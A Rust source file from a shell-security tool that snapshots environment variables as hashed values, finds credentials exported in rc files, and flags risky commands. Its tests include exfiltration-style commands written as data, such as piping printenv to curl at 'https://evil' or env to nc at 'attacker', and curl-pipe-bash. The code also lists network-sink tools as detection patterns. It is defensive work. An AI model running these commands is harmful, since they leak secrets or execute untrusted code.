//! Environment-variable lifecycle monitoring (M9 ch4).
//!
//! Backs `tirith env guard|diff|explain`. The sensitive-variable list is the
//! SAME one [`crate::safe_command`]'s env-scrub transform uses (via
//! [`sensitive_env_vars`]), with an optional user extension from
//! [`crate::policy::Policy::env_guard_sensitive_vars`] — one source of truth.
//!
//! Provides: [`EnvSnapshot`] (name + 8-char value-hash record, **never a raw
//! value**), [`diff_sensitive`] (newly-set/changed sensitive vars since shell
//! start), [`explain_var`] (where a var is `export`ed — file+line, **value
//! masked**), and rule helpers for the three M9 ch4 [`RuleId`]s. The rules take
//! the set of set sensitive var names as a `&[String]` so they are unit-testable
//! without mutating `std::env` (the libc `setenv` race, PR #125).
//!
//! Why a child process writes the snapshot: the shell hook execs
//! `tirith env _snapshot` rather than piping env values (which would put secrets
//! on a pipe/tmpfile). The child reads its OWN inherited `std::env` and writes
//! names + 8-char hashes — no value crosses an argv boundary or temp file.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::tokenize::ShellType;
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Re-export of the single source-of-truth sensitive env-var list. M9 ch4
/// shares the exact list the M6 ch5 env-scrub transform uses; see
/// [`crate::safe_command::sensitive_env_vars`].
pub use crate::safe_command::sensitive_env_vars;

/// Schema version for the on-disk env snapshot. Bump + migrate on layout
/// change (mirrors the persistence snapshot's forward-compat contract).
fn default_schema_version() -> u32 {
    1
}

/// Leading hex chars of `SHA-256(value)` stored per variable. 8 chars = 32 bits:
/// enough to detect a change, far too short to brute-force a secret back out.
/// The full digest is never persisted.
pub const VALUE_HASH_PREFIX_LEN: usize = 8;

/// One recorded variable in the snapshot: its name and an 8-char value-hash
/// prefix. The raw value is NEVER stored.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SnapshotVar {
    /// The variable name (e.g. `AWS_SECRET_ACCESS_KEY`).
    pub name: String,
    /// First [`VALUE_HASH_PREFIX_LEN`] hex chars of `SHA-256(value)`. Used
    /// only for change-detection. Empty string for a recorded-but-empty value.
    pub value_hash8: String,
}

/// A point-in-time snapshot of env variable NAMES plus 8-char value-hash
/// prefixes, taken at shell start and persisted to `state_dir()/env_snapshot.json`.
///
/// Contains NO raw values and NO full hashes. Still written `0600` by
/// [`save_snapshot`] because the *set of names* is itself mildly sensitive (it
/// reveals which credentials you hold).
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct EnvSnapshot {
    /// Snapshot schema version (forward-compat migrations).
    #[serde(default = "default_schema_version")]
    pub schema_version: u32,
    /// Unix epoch seconds the snapshot was taken (informational).
    #[serde(default)]
    pub taken_at: u64,
    /// Recorded variables keyed by name. A `BTreeMap` keeps the on-disk JSON
    /// deterministic.
    #[serde(default)]
    pub vars: BTreeMap<String, SnapshotVar>,
}

impl EnvSnapshot {
    /// Build a snapshot from `(name, value)` pairs — the production caller
    /// passes `std::env::vars()`; tests pass a synthetic iterator. Only the
    /// 8-char value-hash prefix is retained; the value is dropped immediately.
    pub fn from_env_pairs<I, K, V>(pairs: I, taken_at: u64) -> Self
    where
        I: IntoIterator<Item = (K, V)>,
        K: AsRef<str>,
        V: AsRef<str>,
    {
        let mut vars = BTreeMap::new();
        for (k, v) in pairs {
            let name = k.as_ref().to_string();
            let value_hash8 = value_hash8(v.as_ref());
            vars.insert(name.clone(), SnapshotVar { name, value_hash8 });
        }
        EnvSnapshot {
            schema_version: 1,
            taken_at,
            vars,
        }
    }

    /// Build a snapshot from the current process environment. Used by the
    /// hidden `tirith env _snapshot` child the shell hook execs.
    pub fn from_current_process() -> Self {
        let taken_at = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);
        Self::from_env_pairs(std::env::vars(), taken_at)
    }
}

/// First [`VALUE_HASH_PREFIX_LEN`] hex chars of `SHA-256(value)`. An empty
/// value hashes to the empty string (so "set but empty" is distinguishable
/// from "set with a value").
pub fn value_hash8(value: &str) -> String {
    if value.is_empty() {
        return String::new();
    }
    use sha2::{Digest, Sha256};
    let digest = Sha256::digest(value.as_bytes());
    let hex = hex_encode(&digest);
    hex.chars().take(VALUE_HASH_PREFIX_LEN).collect()
}

fn hex_encode(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push(char::from_digit((b >> 4) as u32, 16).unwrap());
        s.push(char::from_digit((b & 0x0f) as u32, 16).unwrap());
    }
    s
}

/// How a sensitive variable differs between the shell-start snapshot and the
/// current environment.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EnvDelta {
    /// Set now, absent in the snapshot.
    NewlySet,
    /// Present in both, but the 8-char value-hash differs.
    ValueChanged,
}

impl EnvDelta {
    pub fn as_str(self) -> &'static str {
        match self {
            EnvDelta::NewlySet => "newly_set",
            EnvDelta::ValueChanged => "value_changed",
        }
    }
}

/// One sensitive-variable difference reported by [`diff_sensitive`].
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EnvDiffEntry {
    /// The sensitive variable name.
    pub name: String,
    /// What changed.
    pub delta: EnvDelta,
}

/// Report sensitive vars NEWLY-SET or value-CHANGED since the shell-start
/// snapshot. `current` is `(name → 8-char value-hash)` for the set sensitive
/// vars; `sensitive` is the effective name list (built-in ∪ policy extension).
/// Unchanged or now-unset vars are not reported — the guard surfaces what
/// *appeared* since shell start.
pub fn diff_sensitive(
    snapshot: &EnvSnapshot,
    current: &BTreeMap<String, String>,
    sensitive: &[String],
) -> Vec<EnvDiffEntry> {
    let mut out = Vec::new();
    for name in sensitive {
        let Some(cur_hash) = current.get(name) else {
            continue; // not set now → nothing appeared
        };
        match snapshot.vars.get(name) {
            None => out.push(EnvDiffEntry {
                name: name.clone(),
                delta: EnvDelta::NewlySet,
            }),
            Some(prev) if &prev.value_hash8 != cur_hash => out.push(EnvDiffEntry {
                name: name.clone(),
                delta: EnvDelta::ValueChanged,
            }),
            Some(_) => {} // unchanged
        }
    }
    // Deterministic output regardless of the `sensitive` list ordering.
    out.sort_by(|a, b| a.name.cmp(&b.name));
    out
}

/// The set sensitive vars in *this* process as a `(name → 8-char value-hash)`
/// map, to feed [`diff_sensitive`]. Empty-valued vars are treated as unset
/// (no secret), matching the env-scrub transform's `!v.is_empty()` check.
pub fn current_sensitive_in_process(sensitive: &[String]) -> BTreeMap<String, String> {
    let mut map = BTreeMap::new();
    for name in sensitive {
        if let Some(val) = std::env::var_os(name) {
            let val = val.to_string_lossy();
            if !val.is_empty() {
                map.insert(name.clone(), value_hash8(&val));
            }
        }
    }
    map
}

/// The sensitive var NAMES currently set (non-empty) in this process, in the
/// order they appear in `sensitive`. This is the production-path argument to
/// the engine rules — passing it explicitly (rather than reading `std::env`
/// inside the rule) keeps the rule unit-testable without an env mutation.
pub fn sensitive_env_set_in_process(sensitive: &[String]) -> Vec<String> {
    sensitive
        .iter()
        .filter(|name| std::env::var_os(name).is_some_and(|v| !v.is_empty()))
        .cloned()
        .collect()
}

/// Merge the built-in sensitive list with a user-supplied extension
/// (`policy.env_guard_sensitive_vars`), de-duplicated, built-ins first then
/// the extras in their given order. This is the single place the two sources
/// are combined.
pub fn effective_sensitive_vars(extra: &[String]) -> Vec<String> {
    let mut out: Vec<String> = sensitive_env_vars().iter().map(|s| s.to_string()).collect();
    for e in extra {
        let e = e.trim();
        if !e.is_empty() && !out.iter().any(|x| x == e) {
            out.push(e.to_string());
        }
    }
    out
}

// ─── explain ─────────────────────────────────────────────────────────────────

/// Where a variable is `export`ed: a source file + 1-based line number.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EnvSource {
    /// Display path of the rc/profile file.
    pub file: String,
    /// 1-based line number of the `export`/`set` directive.
    pub line: usize,
    /// The directive line with the VALUE MASKED to `****`. The raw value is
    /// never read into this string.
    pub masked_line: String,
}

/// Result of [`explain_var`]: every rc/profile location that exports `name`,
/// plus whether it is currently set in the live process environment.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct EnvExplain {
    /// The variable queried.
    pub name: String,
    /// `true` if the variable is set in the current process environment
    /// (regardless of where — could be inherited, set inline, etc.).
    pub set_in_process: bool,
    /// rc/profile files that export it, with line numbers (value masked).
    pub sources: Vec<EnvSource>,
}

/// Explain where `name` is set: scans the user's rc/profile files for an
/// `export`/`set -x`/`$env:` directive and reports file + line (value masked),
/// plus whether it is currently set in this process.
///
/// **The value is never read or printed** — [`mask_assignment`] replaces it
/// with `****`.
pub fn explain_var(name: &str) -> EnvExplain {
    let home = home::home_dir();
    explain_var_in(name, home.as_deref())
}

/// Testable core of [`explain_var`]: scan rc files under `home`.
pub fn explain_var_in(name: &str, home: Option<&Path>) -> EnvExplain {
    let set_in_process = std::env::var_os(name).is_some();
    let mut sources = Vec::new();
    if let Some(home) = home {
        for rel in RC_FILES {
            let path = home.join(rel);
            scan_rc_for_export(&path, name, &mut sources);
        }
    }
    EnvExplain {
        name: name.to_string(),
        set_in_process,
        sources,
    }
}

/// Scan rc/profile files for `export`s of any SENSITIVE var, emitting a
/// [`RuleId::EnvSensitivePersistedInShellRc`] (High) finding per (var, location).
/// The value is NEVER read or printed; evidence carries the masked directive
/// line. `sensitive` is the effective name list; production passes
/// `home::home_dir()`, tests a tempdir root.
pub fn scan_rc_for_sensitive_exports(sensitive: &[String], home: Option<&Path>) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Some(home) = home else {
        return findings;
    };
    for name in sensitive {
        let mut sources = Vec::new();
        for rel in RC_FILES {
            scan_rc_for_export(&home.join(rel), name, &mut sources);
        }
        for src in sources {
            findings.push(Finding {
                rule_id: RuleId::EnvSensitivePersistedInShellRc,
                severity: Severity::High,
                title: format!("Sensitive env var {name} exported in a shell rc/profile"),
                description: format!(
                    "{name} is exported in {} (line {}). A credential persisted in shell \
                     config loads into every shell and is a common exfiltration target. \
                     Load it on demand instead. (value masked: {})",
                    src.file, src.line, src.masked_line
                ),
                evidence: vec![Evidence::Text {
                    // The masked_line already has the value replaced with ****.
                    detail: format!("{}:{} {}", src.file, src.line, src.masked_line),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }
    findings
}

/// rc/profile files scanned by [`explain_var`]. Mirrors the persistence
/// module's shell-rc set so the two surfaces agree on "where shell config
/// lives".
const RC_FILES: &[&str] = &[
    ".bashrc",
    ".bash_profile",
    ".zshrc",
    ".zprofile",
    ".zshenv",
    ".profile",
    ".config/fish/config.fish",
];

/// Append every `export`/`set`/`$env:` line in `path` that assigns `name`,
/// with the value masked. Missing / unreadable files are silently skipped.
fn scan_rc_for_export(path: &Path, name: &str, out: &mut Vec<EnvSource>) {
    let Ok(contents) = std::fs::read_to_string(path) else {
        return;
    };
    for (idx, raw) in contents.lines().enumerate() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if line_exports_var(line, name) {
            out.push(EnvSource {
                file: path.display().to_string(),
                line: idx + 1,
                masked_line: mask_assignment(line, name),
            });
        }
    }
}

/// `true` when `line` assigns/exports the variable `name`. Recognizes the
/// common POSIX, fish, and PowerShell shapes:
///   * `export NAME=…`, `NAME=…`, `declare -x NAME=…`, `typeset -x NAME=…`
///   * `set -x NAME …` (fish), `set --export NAME …`
///   * `setenv NAME …` (csh/tcsh)
///   * `$env:NAME = …` (PowerShell)
fn line_exports_var(line: &str, name: &str) -> bool {
    // PowerShell `$env:NAME = ...`
    if let Some(rest) = line.strip_prefix("$env:") {
        let var = rest.split(['=', ' ', '\t']).next().unwrap_or("");
        return var == name;
    }

    let mut toks = line.split_whitespace();
    let Some(first) = toks.next() else {
        return false;
    };

    // fish: `set -x NAME ...` / `set --export NAME ...` / `setenv NAME ...`
    if first == "set" {
        for t in toks {
            if t.starts_with('-') {
                continue; // flag (-x, --export, -gx, …)
            }
            return t == name;
        }
        return false;
    }
    if first == "setenv" {
        return toks.next() == Some(name);
    }

    // POSIX: optional leading `export` / `declare -x` / `typeset -x`, then
    // `NAME=...`. Find the token carrying the `NAME=` assignment.
    let assign_tok = match first {
        "export" | "declare" | "typeset" | "local" | "readonly" => {
            // Skip any flags, take the first `NAME=...`-shaped token.
            line.split_whitespace()
                .skip(1)
                .find(|t| !t.starts_with('-'))
        }
        _ => Some(first),
    };
    match assign_tok {
        Some(tok) => tok
            .split_once('=')
            .map(|(lhs, _)| lhs == name)
            .unwrap_or(false),
        None => false,
    }
}

/// Replace the assigned value of `name` in `line` with `****`. Operates on the
/// already-trimmed directive line. The value bytes are never copied into the
/// result.
fn mask_assignment(line: &str, name: &str) -> String {
    // PowerShell `$env:NAME = value`
    if line.starts_with("$env:") {
        if let Some(eq) = line.find('=') {
            return format!("{} ****", &line[..eq + 1]);
        }
    }
    // fish `set -x NAME value...` / `setenv NAME value`
    let mut toks = line.split_whitespace();
    if let Some(first) = toks.next() {
        if first == "set" || first == "setenv" {
            // Rebuild: everything up to and including the NAME token, then ****.
            let mut prefix: Vec<&str> = vec![first];
            let mut found_name = false;
            for t in line.split_whitespace().skip(1) {
                prefix.push(t);
                if t == name {
                    found_name = true;
                    break;
                }
            }
            if found_name {
                return format!("{} ****", prefix.join(" "));
            }
        }
    }
    // POSIX `... NAME=value` — mask everything after the first `=` that
    // belongs to NAME.
    if let Some(pos) = find_name_assign_eq(line, name) {
        return format!("{}****", &line[..pos + 1]);
    }
    // Fallback: we matched the var but couldn't locate the value boundary —
    // return a fully-masked placeholder rather than risk echoing the value.
    format!("{name}=****")
}

/// Byte offset of the `=` that assigns `name` in a POSIX directive line, or
/// `None`. Scans whitespace-delimited tokens for `NAME=` and returns the
/// offset of that `=` within `line`.
fn find_name_assign_eq(line: &str, name: &str) -> Option<usize> {
    let mut search_from = 0;
    for tok in line.split_whitespace() {
        // Locate this token's start in the original line.
        let tok_start = line[search_from..].find(tok)? + search_from;
        search_from = tok_start + tok.len();
        if let Some((lhs, _)) = tok.split_once('=') {
            if lhs == name {
                return Some(tok_start + lhs.len());
            }
        }
    }
    None
}

// ─── on-disk snapshot ──────────────────────────────────────────────────────

/// Default snapshot path: `state_dir()/env_snapshot.json`.
pub fn snapshot_path() -> Option<PathBuf> {
    crate::policy::state_dir().map(|d| d.join("env_snapshot.json"))
}

/// Load the env snapshot from `path`, returning a default (empty) snapshot if
/// the file is missing or unparseable — a missing snapshot is the expected
/// "no shell-start baseline yet" state, not an error.
pub fn load_snapshot(path: &Path) -> EnvSnapshot {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_default()
}

/// Persist `snapshot` to `path`. On Unix the file is created `0600` AT OPEN TIME
/// (via `OpenOptions::mode`) so there is no umask-race window where the snapshot
/// is briefly world-readable. A chmod failure is propagated.
pub fn save_snapshot(path: &Path, snapshot: &EnvSnapshot) -> std::io::Result<()> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    let json = serde_json::to_string_pretty(snapshot)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;

    let mut opts = std::fs::OpenOptions::new();
    opts.write(true).create(true).truncate(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    let mut f = opts.open(path)?;
    use std::io::Write as _;
    f.write_all(json.as_bytes())?;

    // `OpenOptions::mode` only applies on file *creation* — if the file
    // already existed (re-baseline) with looser perms, tighten it now.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o600))?;
    }
    Ok(())
}

// ─── engine-path rules ─────────────────────────────────────────────────────

/// Build the `EnvSensitiveExposedToUnknownScript` finding (High) when a
/// sensitive env var is set AND the command pipes remote content to a shell
/// (`curl … | bash`, etc.). `set_sensitive` (the set sensitive var NAMES) is
/// passed in so the rule is unit-testable without an env mutation. `None` when
/// no sensitive var is set or the command is not pipe-to-interpreter.
pub fn check_sensitive_exposed_to_unknown_script(
    cmd: &str,
    shell: ShellType,
    set_sensitive: &[String],
) -> Option<Finding> {
    if set_sensitive.is_empty() {
        return None;
    }
    if !is_pipe_to_interpreter_shape(cmd, shell) {
        return None;
    }
    // List the exposed var NAMES (never values) in the evidence.
    let names = set_sensitive.join(", ");
    Some(Finding {
        rule_id: RuleId::EnvSensitiveExposedToUnknownScript,
        severity: Severity::High,
        title: "Sensitive env var exposed to an unknown downloaded script".to_string(),
        description: format!(
            "{} sensitive environment variable(s) are set and this command pipes \
             remote content into a shell interpreter. A malicious script inherits \
             and can exfiltrate them. Exposed: {names}.",
            set_sensitive.len()
        ),
        evidence: vec![Evidence::Text {
            detail: format!("sensitive_env_set={names}"),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    })
}

/// Build the `EnvPrintenvToNetworkSink` finding (Medium) when an environment
/// DUMP (`printenv` / bare `env`) is piped DIRECTLY into a network sink
/// (`curl`/`wget`/`nc`). Dump and sink must be ADJACENT pipe segments, so an
/// unrelated `env` earlier in a chain is not blamed for a later sink. A dump is
/// a bare `printenv` (no var-name arg) or `env` with no command word.
pub fn check_printenv_to_network_sink(cmd: &str, shell: ShellType) -> Option<Finding> {
    let segs = crate::tokenize::tokenize(cmd, shell);
    if segs.len() < 2 {
        return None;
    }
    // Scan adjacent (source, sink) pairs joined by a pipe: source dumps the
    // environment, sink is a network tool.
    let matched = segs.windows(2).any(|pair| {
        let source = &pair[0];
        let sink = &pair[1];
        if !matches!(sink.preceding_separator.as_deref(), Some("|") | Some("|&")) {
            return false;
        }
        if !is_network_sink(&base_command(sink.command.as_deref().unwrap_or(""), shell)) {
            return false;
        }
        segment_is_env_dump(source, shell)
    });
    if !matched {
        return None;
    }
    Some(Finding {
        rule_id: RuleId::EnvPrintenvToNetworkSink,
        severity: Severity::Medium,
        title: "Environment dumped to a network sink".to_string(),
        description: "`printenv`/`env` is piped into a network tool (curl / wget / nc), \
                      which sends every environment variable — including any secrets — \
                      off the machine."
            .to_string(),
        evidence: vec![Evidence::Text {
            detail: "printenv|env piped to network sink".to_string(),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    })
}

/// `true` when `cmd` is a `<fetch> URL | <shell>` shape with the fetch and shell
/// as ADJACENT pipe segments, so `curl … >/tmp/x; echo hi | bash` does NOT fire.
/// Mirrors the `safe_command` pipe-to-shell recognition, boolean-only.
fn is_pipe_to_interpreter_shape(cmd: &str, shell: ShellType) -> bool {
    let segs = crate::tokenize::tokenize(cmd, shell);
    if segs.len() < 2 {
        return false;
    }
    segs.windows(2).any(|pair| {
        let source = &pair[0];
        let sink = &pair[1];
        matches!(sink.preceding_separator.as_deref(), Some("|") | Some("|&"))
            && is_url_fetch_command(&base_command(
                source.command.as_deref().unwrap_or(""),
                shell,
            ))
            && is_shell_interpreter(&base_command(sink.command.as_deref().unwrap_or(""), shell))
    })
}

/// `true` when `seg` is an environment DUMP: a bare `printenv` (no var-name arg)
/// or `env` with no command word. `printenv AWS_REGION` / `env FOO=1 cmd` are
/// not dumps.
fn segment_is_env_dump(seg: &crate::tokenize::Segment, shell: ShellType) -> bool {
    let leader = base_command(seg.command.as_deref().unwrap_or(""), shell);
    match leader.as_str() {
        // Flags (`-0`) are fine; any non-flag arg names a specific variable.
        "printenv" => !seg.args.iter().any(|a| !a.starts_with('-')),
        // bare `env` (only flags / `VAR=val` assignments, no command word).
        "env" => seg
            .args
            .iter()
            .all(|a| a.starts_with('-') || a.contains('=')),
        _ => false,
    }
}

fn is_url_fetch_command(cmd: &str) -> bool {
    matches!(cmd, "curl" | "wget" | "http" | "https" | "xh" | "fetch")
}

fn is_shell_interpreter(name: &str) -> bool {
    matches!(
        name,
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" | "ash"
    )
}

fn is_network_sink(name: &str) -> bool {
    matches!(
        name,
        "curl" | "wget" | "nc" | "ncat" | "netcat" | "http" | "https" | "xh"
    )
}

/// Reduce a command token to its base name (strip dir path + a PowerShell
/// `.exe`). Local copy mirroring `safe_command::base_command`.
fn base_command(cmd: &str, shell: ShellType) -> String {
    let stripped = strip_quotes(cmd);
    let base = stripped
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(&stripped)
        .to_string();
    if shell == ShellType::PowerShell {
        base.strip_suffix(".exe")
            .or_else(|| base.strip_suffix(".EXE"))
            .unwrap_or(&base)
            .to_ascii_lowercase()
    } else {
        base
    }
}

fn strip_quotes(s: &str) -> String {
    let t = s.trim();
    if t.len() >= 2
        && ((t.starts_with('"') && t.ends_with('"')) || (t.starts_with('\'') && t.ends_with('\'')))
    {
        t[1..t.len() - 1].to_string()
    } else {
        t.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn s(v: &str) -> String {
        v.to_string()
    }

    // ── snapshot + hashing ────────────────────────────────────────────────

    #[test]
    fn value_hash8_is_8_chars_and_value_free() {
        let h = value_hash8("super-secret-token-value");
        assert_eq!(h.len(), 8);
        assert!(h.chars().all(|c| c.is_ascii_hexdigit()));
        // The hash must not contain the value.
        assert!(!h.contains("secret"));
    }

    #[test]
    fn value_hash8_empty_value_is_empty() {
        assert_eq!(value_hash8(""), "");
    }

    #[test]
    fn snapshot_from_pairs_stores_names_and_hashes_only() {
        let snap = EnvSnapshot::from_env_pairs(
            [
                ("AWS_SECRET_ACCESS_KEY", "AKIAsecretvalue"),
                ("PATH", "/usr/bin"),
            ],
            123,
        );
        let v = snap.vars.get("AWS_SECRET_ACCESS_KEY").unwrap();
        assert_eq!(v.value_hash8.len(), 8);
        // Serialize the whole snapshot and confirm no raw value leaks.
        let json = serde_json::to_string(&snap).unwrap();
        assert!(!json.contains("AKIAsecretvalue"), "{json}");
        assert!(json.contains("AWS_SECRET_ACCESS_KEY"));
    }

    #[test]
    fn snapshot_round_trips_through_json() {
        let snap = EnvSnapshot::from_env_pairs([("GITHUB_TOKEN", "ghp_xxx")], 7);
        let json = serde_json::to_string(&snap).unwrap();
        let back: EnvSnapshot = serde_json::from_str(&json).unwrap();
        assert_eq!(back.vars.len(), 1);
        assert_eq!(back.taken_at, 7);
    }

    // ── diff ──────────────────────────────────────────────────────────────

    #[test]
    fn diff_reports_newly_set_sensitive_var() {
        let snap = EnvSnapshot::from_env_pairs(Vec::<(&str, &str)>::new(), 0);
        let mut current = BTreeMap::new();
        current.insert(s("AWS_SECRET_ACCESS_KEY"), value_hash8("v"));
        let sensitive = vec![s("AWS_SECRET_ACCESS_KEY"), s("GITHUB_TOKEN")];
        let diff = diff_sensitive(&snap, &current, &sensitive);
        assert_eq!(diff.len(), 1);
        assert_eq!(diff[0].name, "AWS_SECRET_ACCESS_KEY");
        assert_eq!(diff[0].delta, EnvDelta::NewlySet);
    }

    #[test]
    fn diff_reports_value_change() {
        let snap = EnvSnapshot::from_env_pairs([("GITHUB_TOKEN", "old")], 0);
        let mut current = BTreeMap::new();
        current.insert(s("GITHUB_TOKEN"), value_hash8("new"));
        let sensitive = vec![s("GITHUB_TOKEN")];
        let diff = diff_sensitive(&snap, &current, &sensitive);
        assert_eq!(diff.len(), 1);
        assert_eq!(diff[0].delta, EnvDelta::ValueChanged);
    }

    #[test]
    fn diff_ignores_unchanged_and_unset() {
        let snap = EnvSnapshot::from_env_pairs([("GITHUB_TOKEN", "same")], 0);
        let mut current = BTreeMap::new();
        current.insert(s("GITHUB_TOKEN"), value_hash8("same"));
        // NPM_TOKEN is sensitive but unset now → not reported.
        let sensitive = vec![s("GITHUB_TOKEN"), s("NPM_TOKEN")];
        let diff = diff_sensitive(&snap, &current, &sensitive);
        assert!(diff.is_empty(), "{diff:?}");
    }

    #[test]
    fn effective_sensitive_vars_merges_and_dedups() {
        let extra = vec![s("MY_CUSTOM_TOKEN"), s("GITHUB_TOKEN"), s("  ")];
        let eff = effective_sensitive_vars(&extra);
        // Built-ins present.
        assert!(eff.iter().any(|v| v == "AWS_SECRET_ACCESS_KEY"));
        // Custom appended once.
        assert_eq!(eff.iter().filter(|v| *v == "MY_CUSTOM_TOKEN").count(), 1);
        // Already-built-in GITHUB_TOKEN not duplicated.
        assert_eq!(eff.iter().filter(|v| *v == "GITHUB_TOKEN").count(), 1);
        // Blank skipped.
        assert!(!eff.iter().any(|v| v.trim().is_empty()));
    }

    // ── explain (value never printed) ─────────────────────────────────────

    #[test]
    fn explain_finds_export_and_masks_value() {
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path();
        std::fs::write(
            home.join(".zshrc"),
            "# config\nexport AWS_SECRET_ACCESS_KEY=AKIAREALSECRET123\nalias ll='ls -la'\n",
        )
        .unwrap();
        let ex = explain_var_in("AWS_SECRET_ACCESS_KEY", Some(home));
        assert_eq!(ex.sources.len(), 1);
        assert_eq!(ex.sources[0].line, 2);
        // The masked line must NOT contain the real value.
        assert!(
            !ex.sources[0].masked_line.contains("AKIAREALSECRET123"),
            "{}",
            ex.sources[0].masked_line
        );
        assert!(ex.sources[0].masked_line.contains("****"));
    }

    #[test]
    fn explain_handles_fish_and_powershell_and_plain_assignment() {
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path();
        std::fs::create_dir_all(home.join(".config/fish")).unwrap();
        std::fs::write(
            home.join(".config/fish/config.fish"),
            "set -x GH_TOKEN ghp_fishsecret\n",
        )
        .unwrap();
        std::fs::write(home.join(".profile"), "NPM_TOKEN=npm_plainsecret\n").unwrap();

        let fish = explain_var_in("GH_TOKEN", Some(home));
        assert_eq!(fish.sources.len(), 1);
        assert!(!fish.sources[0].masked_line.contains("ghp_fishsecret"));
        assert!(fish.sources[0].masked_line.contains("****"));

        let plain = explain_var_in("NPM_TOKEN", Some(home));
        assert_eq!(plain.sources.len(), 1);
        assert!(!plain.sources[0].masked_line.contains("npm_plainsecret"));
    }

    #[test]
    fn explain_unknown_var_reports_no_sources() {
        let dir = tempfile::tempdir().unwrap();
        let ex = explain_var_in("NOPE_NOT_SET", Some(dir.path()));
        assert!(ex.sources.is_empty());
    }

    #[test]
    fn line_exports_var_matches_shapes() {
        assert!(line_exports_var("export FOO=bar", "FOO"));
        assert!(line_exports_var("FOO=bar", "FOO"));
        assert!(line_exports_var("declare -x FOO=bar", "FOO"));
        assert!(line_exports_var("set -x FOO bar", "FOO"));
        assert!(line_exports_var("set --export FOO bar", "FOO"));
        assert!(line_exports_var("setenv FOO bar", "FOO"));
        assert!(line_exports_var("$env:FOO = 'bar'", "FOO"));
        // Non-matches.
        assert!(!line_exports_var("export FOOBAR=baz", "FOO"));
        assert!(!line_exports_var("echo FOO=bar", "FOO"));
        assert!(!line_exports_var("# export FOO=bar", "FOO"));
    }

    // ── rule: EnvSensitiveExposedToUnknownScript ──────────────────────────

    #[test]
    fn exposed_rule_fires_on_curl_pipe_bash_with_sensitive_set() {
        let set = vec![s("AWS_SECRET_ACCESS_KEY")];
        let f = check_sensitive_exposed_to_unknown_script(
            "curl https://untrusted/install.sh | bash",
            ShellType::Posix,
            &set,
        );
        let f = f.expect("rule should fire");
        assert_eq!(f.rule_id, RuleId::EnvSensitiveExposedToUnknownScript);
        assert_eq!(f.severity, Severity::High);
        // Evidence lists the NAME, never a value.
        let ev = format!("{:?}", f.evidence);
        assert!(ev.contains("AWS_SECRET_ACCESS_KEY"), "{ev}");
    }

    #[test]
    fn exposed_rule_silent_when_no_sensitive_var_set() {
        let f = check_sensitive_exposed_to_unknown_script(
            "curl https://untrusted/install.sh | bash",
            ShellType::Posix,
            &[],
        );
        assert!(f.is_none());
    }

    #[test]
    fn exposed_rule_silent_when_not_pipe_to_interpreter() {
        let set = vec![s("GITHUB_TOKEN")];
        // No pipe-to-shell — just a plain curl.
        let f = check_sensitive_exposed_to_unknown_script(
            "curl https://untrusted/file.txt -o out",
            ShellType::Posix,
            &set,
        );
        assert!(f.is_none());
    }

    #[test]
    fn exposed_rule_requires_fetch_to_be_the_pipe_source() {
        // The fetch must be ADJACENT to and piped INTO the shell. Here the
        // remote content is redirected to a file, and a SEPARATE `echo` is
        // piped to bash — the secret is not exposed to the downloaded script.
        let set = vec![s("AWS_SECRET_ACCESS_KEY")];
        let f = check_sensitive_exposed_to_unknown_script(
            "curl https://ok >/tmp/x; echo hi | bash",
            ShellType::Posix,
            &set,
        );
        assert!(f.is_none(), "non-adjacent fetch+shell must not fire");
    }

    // ── rule: EnvPrintenvToNetworkSink ────────────────────────────────────

    #[test]
    fn printenv_to_curl_fires() {
        let f =
            check_printenv_to_network_sink("printenv | curl -d @- https://evil", ShellType::Posix);
        let f = f.expect("rule should fire");
        assert_eq!(f.rule_id, RuleId::EnvPrintenvToNetworkSink);
        assert_eq!(f.severity, Severity::Medium);
    }

    #[test]
    fn env_dump_to_nc_fires() {
        let f = check_printenv_to_network_sink("env | nc attacker 4444", ShellType::Posix);
        assert!(f.is_some());
    }

    #[test]
    fn env_running_a_command_does_not_fire() {
        // `env FOO=1 some-cmd | grep x` is NOT an environment dump — `env`
        // here runs `some-cmd`, it does not print the environment.
        let f =
            check_printenv_to_network_sink("env FOO=1 mycmd | curl https://x", ShellType::Posix);
        assert!(f.is_none(), "env-with-command must not fire");
    }

    #[test]
    fn printenv_to_local_pager_does_not_fire() {
        let f = check_printenv_to_network_sink("printenv | less", ShellType::Posix);
        assert!(f.is_none());
    }

    #[test]
    fn printenv_with_var_name_arg_does_not_fire() {
        // `printenv AWS_REGION` prints ONE variable, not the environment.
        let f = check_printenv_to_network_sink(
            "printenv AWS_REGION | curl https://x",
            ShellType::Posix,
        );
        assert!(f.is_none(), "printenv with a var-name arg is not a dump");
        // A -0 flag is fine (still a full dump).
